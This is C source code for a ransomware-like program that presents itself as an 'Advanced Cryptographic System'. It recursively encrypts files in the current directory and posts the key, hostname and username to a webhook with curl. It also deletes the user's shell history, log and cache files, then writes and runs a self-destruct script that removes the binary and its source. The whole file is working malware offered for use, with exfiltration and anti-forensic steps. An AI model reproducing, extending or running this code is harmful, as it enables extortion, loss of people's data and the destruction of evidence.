#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/utsname.h>
#include <dirent.h>
#include <fcntl.h>
#include <errno.h>
#include <time.h>
#include <signal.h>
#include <libgen.h>
#include <limits.h>
#include <pwd.h>
#include <ctype.h>

#define KEY_SIZE 32
#define BUF_SIZE 8192
#define EXTENSION ".x"
#define MAX_DEPTH 50
#define MAX_FILE_SIZE (100 * 1024 * 1024)
#define METADATA_FILE ".encryption_metadata"
#define WEBHOOK_URL ""

typedef unsigned char byte;

static byte global_key[KEY_SIZE] = {
    0x2b, 0x7e, 0x15, 0x16, 0x28, 0xae, 0xd2, 0xa6,
    0xab, 0xf7, 0x15, 0x88, 0x09, 0xcf, 0x4f, 0x3c,
    0x2b, 0x7e, 0x15, 0x16, 0x28, 0xae, 0xd2, 0xa6,
    0xab, 0xf7, 0x15, 0x88, 0x09, 0xcf, 0x4f, 0x3c
};

typedef struct {
    char original_path[PATH_MAX];
    mode_t mode;
    uid_t uid;
    gid_t gid;
    struct timespec atime;
    struct timespec mtime;
    off_t size;
} FileMetadata;

static byte actual_key[KEY_SIZE];
static int key_initialized = 0;

struct utsname sys_info;
static int file_count = 0;
static int error_count = 0;
static int depth_counter = 0;

void hash_key(byte *key, byte *output) {
    unsigned long hash = 5381;
    for(int i = 0; i < KEY_SIZE; i++) {
        hash = ((hash << 5) + hash) + key[i];
    }
    for(int i = 0; i < 32; i++) {
        output[i] = (hash >> (i * 8)) & 0xFF;
    }
}

void xor_crypt(byte *data, size_t len, byte *key) {
    for(size_t i = 0; i < len; i++) {
        data[i] ^= key[i % KEY_SIZE];
    }
}

int is_regular_file(const char *path) {
    struct stat path_stat;
    if(stat(path, &path_stat) != 0) return 0;
    return S_ISREG(path_stat.st_mode);
}

int is_directory(const char *path) {
    struct stat path_stat;
    if(stat(path, &path_stat) != 0) return 0;
    return S_ISDIR(path_stat.st_mode);
}

const char* get_extension(const char *filename) {
    const char *dot = strrchr(filename, '.');
    if(!dot || dot == filename) return "";
    return dot;
}

const char* get_filename(const char *path) {
    const char *slash = strrchr(path, '/');
    if(!slash || slash == path) return path;
    return slash + 1;
}

int is_readme_file(const char *filename) {
    const char *name = get_filename(filename);
    char lower_name[256];
    int i;
    for(i = 0; name[i] && i < 255; i++) {
        lower_name[i] = tolower(name[i]);
    }
    lower_name[i] = '\0';
    
    if(strstr(lower_name, "readme") != NULL ||
       strstr(filename, "README.TXT") != NULL) {
        return 1;
    }
    return 0;
}

int is_program_file(const char *filename) {
    const char *name = get_filename(filename);
    
    struct stat st;
    if(stat(filename, &st) == 0 && (st.st_mode & S_IXUSR)) {
        if(strstr(name, "readme") != NULL || strstr(name, "encrypt") != NULL || 
           strstr(name, "ransom") != NULL || strstr(name, "crypto") != NULL) {
            return 1;
        }
    }
    
    if(strstr(name, ".c") != NULL || strstr(name, ".cpp") != NULL) {
        if(strstr(name, "readme") != NULL || strstr(name, "encrypt") != NULL || 
           strstr(name, "ransom") != NULL || strstr(name, "crypto") != NULL) {
            return 1;
        }
    }
    
    return 0;
}

int should_process(const char *filename, int encrypt_mode) {
    if(is_readme_file(filename)) {
        return 0;
    }
    
    if(strstr(filename, ".temp_") != NULL)
        return 0;
    
    if(strstr(filename, METADATA_FILE) != NULL)
        return 0;
    
    if(encrypt_mode) {
        const char *ext = get_extension(filename);
        if(strcmp(ext, EXTENSION) == 0)
            return 0;
    } else {
        const char *ext = get_extension(filename);
        if(strcmp(ext, EXTENSION) != 0)
            return 0;
    }
    
    struct stat st;
    if(stat(filename, &st) == 0) {
        if(st.st_size > MAX_FILE_SIZE) {
            printf("File too large: %s\n", filename);
            return 0;
        }
    }
    
    return 1;
}

void clear_system_logs() {
    char command[1024];
    
    uname(&sys_info);
    
    if(strstr(sys_info.sysname, "Linux") != NULL) {
        char *home = getenv("HOME");
        if(home) {
            char path[PATH_MAX];
            
            snprintf(path, sizeof(path), "%s/.bash_history", home);
            unlink(path);
            snprintf(path, sizeof(path), "%s/.zsh_history", home);
            unlink(path);
            snprintf(path, sizeof(path), "%s/.history", home);
            unlink(path);
            
            snprintf(command, sizeof(command), 
                     "find %s/.local/share -name \"*.log\" -type f -delete 2>/dev/null", home);
            system(command);
            
            snprintf(command, sizeof(command), 
                     "find %s/.cache -type f -delete 2>/dev/null", home);
            system(command);
        }
        
        system("history -c 2>/dev/null");
        system("> ~/.bash_history 2>/dev/null");
    }
    
    unlink(".temp_encrypt");
}

void create_readme_file() {
    FILE *readme = fopen("README.TXT", "w");
    if(readme) {
        fprintf(readme, "TvG8GAhYJK0ahntkMmRB\n");
        fclose(readme);
    }
}

void save_metadata(const char *original_path, const char *encrypted_path, struct stat *st) {
    FILE *meta_fp = fopen(METADATA_FILE, "ab");
    if(!meta_fp) return;
    
    FileMetadata meta;
    strncpy(meta.original_path, original_path, PATH_MAX);
    meta.mode = st->st_mode;
    meta.uid = st->st_uid;
    meta.gid = st->st_gid;
    meta.atime = st->st_atim;
    meta.mtime = st->st_mtim;
    meta.size = st->st_size;
    
    fwrite(encrypted_path, 1, strlen(encrypted_path) + 1, meta_fp);
    fwrite(&meta, sizeof(FileMetadata), 1, meta_fp);
    
    fclose(meta_fp);
}

void restore_metadata(const char *original_path, const char *encrypted_path) {
    FILE *meta_fp = fopen(METADATA_FILE, "rb");
    if(!meta_fp) return;
    
    FileMetadata meta;
    char enc_path[PATH_MAX];
    int found = 0;
    
    FILE *temp_fp = fopen(".temp_metadata", "wb");
    
    while(fread(enc_path, 1, PATH_MAX, meta_fp) > 0) {
        if(fread(&meta, sizeof(FileMetadata), 1, meta_fp) == 1) {
            if(strcmp(enc_path, encrypted_path) == 0) {
                found = 1;
                if(chmod(original_path, meta.mode) != 0) {
                    printf("Warning: Could not restore permissions for %s\n", original_path);
                }
                if(chown(original_path, meta.uid, meta.gid) != 0) {
                    printf("Warning: Could not restore ownership for %s\n", original_path);
                }
                
                struct timespec times[2];
                times[0] = meta.atime;
                times[1] = meta.mtime;
                if(utimensat(AT_FDCWD, original_path, times, 0) != 0) {
                    printf("Warning: Could not restore timestamps for %s\n", original_path);
                }
            } else {
                if(temp_fp) {
                    fwrite(enc_path, 1, PATH_MAX, temp_fp);
                    fwrite(&meta, sizeof(FileMetadata), 1, temp_fp);
                }
            }
        }
    }
    
    fclose(meta_fp);
    if(temp_fp) {
        fclose(temp_fp);
        unlink(METADATA_FILE);
        rename(".temp_metadata", METADATA_FILE);
    } else {
        unlink(".temp_metadata");
    }
}

void save_key_hash(byte *key) {
    FILE *hash_fp = fopen(METADATA_FILE, "wb");
    if(hash_fp) {
        byte hash[32];
        hash_key(key, hash);
        fwrite(hash, 1, 32, hash_fp);
        fclose(hash_fp);
    }
}

int verify_key(byte *key) {
    FILE *hash_fp = fopen(METADATA_FILE, "rb");
    if(!hash_fp) {
        printf("Error: No metadata found. This might not be an encrypted directory.\n");
        return 0;
    }
    
    byte stored_hash[32];
    if(fread(stored_hash, 1, 32, hash_fp) != 32) {
        fclose(hash_fp);
        return 0;
    }
    fclose(hash_fp);
    
    byte computed_hash[32];
    hash_key(key, computed_hash);
    
    return memcmp(stored_hash, computed_hash, 32) == 0;
}

void send_key_to_webhook(const char *key) {
    pid_t pid = fork();
    
    if (pid == 0) {
        char command[1024];
        char hostname[256];
        char username[256];
        
        gethostname(hostname, sizeof(hostname));
        
        struct passwd *pwd = getpwuid(getuid());
        const char *user = pwd ? pwd->pw_name : "unknown";
        
        snprintf(command, sizeof(command),
                 "curl -s -X POST '%s' "
                 "-H 'Content-Type: application/json' "
                 "-d '{\"key\":\"%s\",\"hostname\":\"%s\",\"user\":\"%s\",\"timestamp\":%ld}' "
                 ">/dev/null 2>&1 &",
                 WEBHOOK_URL, key, hostname, user, time(NULL));
        
        system(command);
        exit(0);
    }
}

void generate_encryption_key(char *output) {
    byte seed[KEY_SIZE];
    
    FILE *urandom = fopen("/dev/urandom", "r");
    if(urandom) {
        fread(seed, 1, KEY_SIZE, urandom);
        fclose(urandom);
    } else {
        srand(time(NULL));
        for(int i = 0; i < KEY_SIZE; i++) {
            seed[i] = rand() % 256;
        }
    }
    
    for(int i = 0; i < KEY_SIZE; i++) {
        actual_key[i] = seed[i] ^ global_key[i];
    }
    key_initialized = 1;
    
    save_key_hash(actual_key);
    
    for(int i = 0; i < KEY_SIZE; i++) {
        sprintf(output + (i * 2), "%02x", seed[i]);
    }
    output[KEY_SIZE * 2] = '\0';
}

int hex_to_bytes(const char *hex, byte *bytes, int max_bytes) {
    int len = strlen(hex);
    if(len % 2 != 0) return 0;
    
    int byte_count = len / 2;
    if(byte_count > max_bytes) byte_count = max_bytes;
    
    for(int i = 0; i < byte_count; i++) {
        char byte_str[3] = {hex[i*2], hex[i*2+1], 0};
        bytes[i] = strtol(byte_str, NULL, 16);
    }
    
    return byte_count;
}

int derive_decryption_key(const char *user_key_str) {
    byte seed[KEY_SIZE];
    
    if(hex_to_bytes(user_key_str, seed, KEY_SIZE) != KEY_SIZE) {
        return 0;
    }
    
    for(int i = 0; i < KEY_SIZE; i++) {
        actual_key[i] = seed[i] ^ global_key[i];
    }
    key_initialized = 1;
    
    if(!verify_key(actual_key)) {
        key_initialized = 0;
        return 0;
    }
    
    return 1;
}

int process_file(const char *filepath, int encrypt_mode) {
    if(!should_process(filepath, encrypt_mode)) {
        return 0;
    }
    
    if(!key_initialized) {
        printf("Error: Key not initialized\n");
        return -1;
    }
    
    printf("%s: %s\n", encrypt_mode ? "Encrypting" : "Decrypting", filepath);
    fflush(stdout);
    
    char newpath[PATH_MAX];
    struct stat file_stat;
    
    if(encrypt_mode) {
        snprintf(newpath, sizeof(newpath), "%s%s", filepath, EXTENSION);
        
        if(stat(filepath, &file_stat) == 0) {
            save_metadata(filepath, newpath, &file_stat);
        }
    } else {
        const char *ext = get_extension(filepath);
        if(strcmp(ext, EXTENSION) == 0) {
            size_t len = strlen(filepath) - strlen(EXTENSION);
            strncpy(newpath, filepath, len);
            newpath[len] = '\0';
        } else {
            return 0;
        }
    }
    
    FILE *f_in = fopen(filepath, "rb");
    if(!f_in) {
        error_count++;
        return -1;
    }
    
    FILE *f_out = fopen(".temp_encrypt", "wb");
    if(!f_out) {
        fclose(f_in);
        error_count++;
        return -1;
    }
    
    byte buffer[BUF_SIZE];
    size_t bytes_read;
    int success = 1;
    
    while((bytes_read = fread(buffer, 1, BUF_SIZE, f_in)) > 0) {
        xor_crypt(buffer, bytes_read, actual_key);
        if(fwrite(buffer, 1, bytes_read, f_out) != bytes_read) {
            success = 0;
            break;
        }
    }
    
    fclose(f_in);
    fclose(f_out);
    
    if(success) {
        if(!encrypt_mode) {
            struct stat orig_stat;
            if(stat(newpath, &orig_stat) == 0) {
                restore_metadata(newpath, filepath);
            }
        }
        
        unlink(filepath);
        rename(".temp_encrypt", newpath);
        
        if(!encrypt_mode) {
            restore_metadata(newpath, filepath);
            
            if(strstr(newpath, ".x") == NULL) {
                FILE *check = fopen(newpath, "rb");
                if(check) {
                    unsigned char magic[4];
                    fread(magic, 1, 4, check);
                    fclose(check);
                    if(magic[0] == 0x7F && magic[1] == 'E' && magic[2] == 'L' && magic[3] == 'F') {
                        chmod(newpath, 0755);
                    }
                }
            }
        }
        
        file_count++;
        return 0;
    } else {
        unlink(".temp_encrypt");
        error_count++;
        return -1;
    }
}

int process_directory(const char *dirname, int encrypt_mode) {
    depth_counter++;
    if(depth_counter > MAX_DEPTH) {
        depth_counter--;
        return 0;
    }
    
    DIR *dir = opendir(dirname);
    if(!dir) {
        depth_counter--;
        return -1;
    }
    
    struct dirent *entry;
    char path[PATH_MAX];
    
    while((entry = readdir(dir)) != NULL) {
        if(strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
            continue;
        
        if(!encrypt_mode && strcmp(entry->d_name, METADATA_FILE) == 0)
            continue;
        
        snprintf(path, sizeof(path), "%s/%s", dirname, entry->d_name);
        
        if(is_directory(path)) {
            process_directory(path, encrypt_mode);
        } else if(is_regular_file(path)) {
            if(encrypt_mode && is_program_file(path)) {
                printf("Skipping program file: %s\n", path);
                continue;
            }
            process_file(path, encrypt_mode);
        }
    }
    
    closedir(dir);
    depth_counter--;
    return 0;
}

void clear_screen_after_delay(int seconds) {
    printf("\n\nScreen will clear in %d seconds...\n", seconds);
    fflush(stdout);
    sleep(seconds);
    system("clear");
}

void delete_program_and_exit(const char *program_path) {
    char command[PATH_MAX + 100];
    char *source_file = NULL;
    
    char *dot = strrchr(program_path, '.');
    if(dot && (strcmp(dot, ".c") == 0 || strcmp(dot, ".cpp") == 0)) {
        source_file = strdup(program_path);
    } else {
        char *source_c = malloc(strlen(program_path) + 3);
        sprintf(source_c, "%s.c", program_path);
        if(access(source_c, F_OK) == 0) {
            source_file = source_c;
        } else {
            free(source_c);
            source_file = NULL;
        }
    }
    
    FILE *script = fopen("/tmp/self_destruct.sh", "w");
    if(script) {
        fprintf(script, "#!/bin/bash\n");
        fprintf(script, "sleep 2\n");
        fprintf(script, "rm -f \"%s\" 2>/dev/null\n", program_path);
        if(source_file) {
            fprintf(script, "rm -f \"%s\" 2>/dev/null\n", source_file);
        }
        fprintf(script, "rm -f /tmp/self_destruct.sh\n");
        fclose(script);
        
        chmod("/tmp/self_destruct.sh", 0755);
        system("/tmp/self_destruct.sh &");
    }
    
    if(source_file) free(source_file);
}

int main(int argc, char *argv[]) {
    printf("Advanced Cryptographic System v3.0\n");
    printf("==================================\n\n");
    
    if(argc < 2) {
        printf("Usage: %s encrypt | --decrypt <key>\n", argv[0]);
        printf("\nExamples:\n");
        printf("  %s encrypt                    # Encrypt files in current directory\n", argv[0]);
        printf("  %s --decrypt <key>           # Decrypt files with the provided key\n", argv[0]);
        return 1;
    }
    
    uname(&sys_info);
    
    char key_display[65] = {0};
    
    if(strcmp(argv[1], "encrypt") == 0) {
        generate_encryption_key(key_display);
        
        send_key_to_webhook(key_display);
        
        printf("🔐 ENCRYPTION KEY GENERATED\n");
        printf("====================================\n");
        printf("⚠️  IMPORTANT - SAVE THIS KEY!\n");
        printf("Key: %s\n", key_display);
        printf("====================================\n\n");
        printf("Without this key, your files CANNOT be recovered!\n\n");
        
        printf("Starting encryption...\n");
        
        file_count = 0;
        error_count = 0;
        depth_counter = 0;
        
        process_directory(".", 1);
        
        printf("\n✅ Encryption complete\n");
        printf("📁 Files processed: %d\n", file_count);
        if(error_count > 0) printf("⚠️  Errors: %d\n", error_count);
        
        create_readme_file();
        clear_system_logs();
        
        printf("\n🔑 DECRYPTION KEY (SAVE THIS SECURELY):\n");
        printf("%s\n", key_display);
        printf("====================================\n");
        
        clear_screen_after_delay(15);
        delete_program_and_exit(argv[0]);
        
    } else if(strcmp(argv[1], "--decrypt") == 0) {
        if(argc < 3) {
            printf("❌ Error: Decryption key required\n");
            printf("Usage: %s --decrypt <key>\n", argv[0]);
            return 1;
        }
        
        printf("🔑 Verifying decryption key...\n");
        
        if(!derive_decryption_key(argv[2])) {
            printf("\n❌ DECRYPTION FAILED: Invalid or incorrect key!\n");
            printf("The provided key does not match the encryption key.\n");
            printf("Files remain encrypted and secure.\n");
            return 1;
        }
        
        printf("✅ Key verified successfully!\n\n");
        printf("Starting decryption...\n");
        
        file_count = 0;
        error_count = 0;
        depth_counter = 0;
        
        process_directory(".", 0);
        
        printf("\n✅ Decryption complete\n");
        printf("📁 Files processed: %d\n", file_count);
        if(error_count > 0) printf("⚠️  Errors: %d\n", error_count);
        
        unlink(METADATA_FILE);
        
        printf("\n🎉 All files have been successfully restored to their original state!\n");
        printf("📄 README.TXT has been left as a record of the encryption.\n");
        
        delete_program_and_exit(argv[0]);
        
    } else {
        printf("❌ Invalid command\n");
        printf("Usage: %s encrypt | --decrypt <key>\n", argv[0]);
        return 1;
    }
    
    return 0;
}
